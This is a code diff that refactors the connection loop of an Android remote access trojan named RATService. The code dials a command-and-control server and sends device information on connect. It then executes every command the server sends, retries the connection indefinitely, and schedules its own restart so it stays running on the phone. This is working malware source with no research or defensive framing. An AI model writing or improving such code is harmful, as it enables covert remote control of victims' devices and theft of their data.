@@ -306,109 +306,114 @@ public class RATService extends Service {
         }
     }
     
-    private void startConnection() {
-        if (executor == null || executor.isShutdown()) {
-            executor = Executors.newSingleThreadExecutor();
-        }
+  private void startConnection() {
+    if (executor == null || executor.isShutdown()) {
+        executor = Executors.newSingleThreadExecutor();
+    }
+    
+    executor.execute(() -> {
+        int retryCount = 0;
+        int consecutiveNetworkErrors = 0;
         
-        executor.execute(() -> {
-            int retryCount = 0;
-            int consecutiveNetworkErrors = 0;
-            
-            while (isRunning.get()) {
-                try {
-                    // Check if network is available first
-                    if (!isNetworkAvailable()) {
-                        Log.d(TAG, "No network available, waiting...");
-                        Thread.sleep(RETRY_INTERVAL * 1000);
-                        continue;
-                    }
-                    
-                    // Reset network error counter on successful check
-                    consecutiveNetworkErrors = 0;
-                    
-                    // Connect with timeout
-                    socket = new Socket();
-                    socket.connect(new InetSocketAddress(Config.SERVER_HOST, Config.SERVER_PORT), CONNECT_TIMEOUT);
-                    socket.setKeepAlive(true);
-                    
-                    out = new PrintWriter(socket.getOutputStream(), true);
-                    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-                    
-                    Log.d(TAG, "✅ Connected to C2 server at " + Config.SERVER_HOST + ":" + Config.SERVER_PORT);
-                    
-                    // Reset counters on successful connection
-                    consecutiveFailures = 0;
-                    retryCount = 0;
-                    
-                    // Send initial device info
-                    sendDeviceInfo();
-                    
-                    // Main processing loop - blocks on readLine()
-                    String line;
-                    long lastReadTime = System.currentTimeMillis();
-                    
-                    while (isRunning.get() && (line = in.readLine()) != null) {
-                        lastReadTime = System.currentTimeMillis();
-                        processCommand(line);
-                    }
-                    
-                    // Check if we've been stuck too long (safety check)
-                    if (System.currentTimeMillis() - lastReadTime > READ_TIMEOUT_CHECK) {
-                        Log.w(TAG, "Read timeout check triggered, reconnecting...");
-                    }
-                    
-                } catch (SocketTimeoutException e) {
-                    Log.e(TAG, "Socket timeout", e);
-                    consecutiveFailures++;
-                } catch (IOException e) {
-                    Log.e(TAG, "Connection error: " + e.getMessage());
-                    consecutiveFailures++;
-                    consecutiveNetworkErrors++;
-                    
-                    // If we get too many network errors, increase wait time
-                    if (consecutiveNetworkErrors > 5) {
-                        Log.w(TAG, "Multiple network errors, waiting longer...");
-                        Thread.sleep(60000); // Wait 1 minute
-                    }
-                } catch (Exception e) {
-                    Log.e(TAG, "Unexpected error", e);
-                    consecutiveFailures++;
-                } finally {
-                    closeConnection();
+        while (isRunning.get()) {
+            try {
+                // Check if network is available first
+                if (!isNetworkAvailable()) {
+                    Log.d(TAG, "No network available, waiting...");
+                    Thread.sleep(RETRY_INTERVAL * 1000);
+                    continue;
                 }
                 
-                // Keep trying forever - NO MAX RETRIES LIMIT
-                if (isRunning.get()) {
-                    // Calculate delay with exponential backoff
-                    long delay;
-                    if (consecutiveFailures < 5) {
-                        delay = RETRY_INTERVAL * 1000; // 30 seconds
-                    } else if (consecutiveFailures < 10) {
-                        delay = 60000; // 1 minute
-                    } else if (consecutiveFailures < 20) {
-                        delay = 120000; // 2 minutes
-                    } else {
-                        delay = 300000; // 5 minutes max
-                    }
-                    
-                    retryCount++;
-                    Log.d(TAG, "Reconnecting in " + (delay/1000) + " seconds (attempt " + retryCount + ")");
-                    
-                    try {
-                        Thread.sleep(delay);
-                    } catch (InterruptedException ie) {
-                        Thread.currentThread().interrupt();
-                        break;
-                    }
+                // Reset network error counter on successful check
+                consecutiveNetworkErrors = 0;
+                
+                // Connect with timeout
+                socket = new Socket();
+                socket.connect(new InetSocketAddress(Config.SERVER_HOST, Config.SERVER_PORT), CONNECT_TIMEOUT);
+                socket.setKeepAlive(true);
+                
+                out = new PrintWriter(socket.getOutputStream(), true);
+                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+                
+                Log.d(TAG, "✅ Connected to C2 server at " + Config.SERVER_HOST + ":" + Config.SERVER_PORT);
+                
+                // Reset counters on successful connection
+                consecutiveFailures = 0;
+                retryCount = 0;
+                
+                // Send initial device info
+                sendDeviceInfo();
+                
+                // Main processing loop - blocks on readLine()
+                String line;
+                long lastReadTime = System.currentTimeMillis();
+                
+                while (isRunning.get() && (line = in.readLine()) != null) {
+                    lastReadTime = System.currentTimeMillis();
+                    processCommand(line);
                 }
+                
+                // Check if we've been stuck too long (safety check)
+                if (System.currentTimeMillis() - lastReadTime > READ_TIMEOUT_CHECK) {
+                    Log.w(TAG, "Read timeout check triggered, reconnecting...");
+                }
+                
+            } catch (SocketTimeoutException e) {
+                Log.e(TAG, "Socket timeout", e);
+                consecutiveFailures++;
+            } catch (IOException e) {
+                Log.e(TAG, "Connection error: " + e.getMessage());
+                consecutiveFailures++;
+                consecutiveNetworkErrors++;
+            } catch (InterruptedException e) {
+                Log.e(TAG, "Sleep interrupted", e);
+                Thread.currentThread().interrupt();
+                break;
+            } catch (Exception e) {
+                Log.e(TAG, "Unexpected error", e);
+                consecutiveFailures++;
+            } finally {
+                closeConnection();
             }
             
-            // If we exit the loop, schedule a full service restart
-            Log.w(TAG, "Connection loop ended, scheduling service restart");
-            scheduleRestartWithAlarm();
-        });
-    }
+            // Keep trying forever - NO MAX RETRIES LIMIT
+            if (isRunning.get()) {
+                // Calculate delay with exponential backoff
+                long delay;
+                if (consecutiveFailures < 5) {
+                    delay = RETRY_INTERVAL * 1000; // 30 seconds
+                } else if (consecutiveFailures < 10) {
+                    delay = 60000; // 1 minute
+                } else if (consecutiveFailures < 20) {
+                    delay = 120000; // 2 minutes
+                } else {
+                    delay = 300000; // 5 minutes max
+                }
+                
+                // If we have too many network errors, increase wait time
+                if (consecutiveNetworkErrors > 5) {
+                    Log.w(TAG, "Multiple network errors, waiting longer...");
+                    delay = Math.max(delay, 60000); // At least 1 minute
+                }
+                
+                retryCount++;
+                Log.d(TAG, "Reconnecting in " + (delay/1000) + " seconds (attempt " + retryCount + ")");
+                
+                try {
+                    Thread.sleep(delay);
+                } catch (InterruptedException ie) {
+                    Log.e(TAG, "Reconnect sleep interrupted", ie);
+                    Thread.currentThread().interrupt();
+                    break;
+                }
+            }
+        }
+        
+        // If we exit the loop, schedule a full service restart
+        Log.w(TAG, "Connection loop ended, scheduling service restart");
+        scheduleRestartWithAlarm();
+    });
+}
     
     private void closeConnection() {
         try {
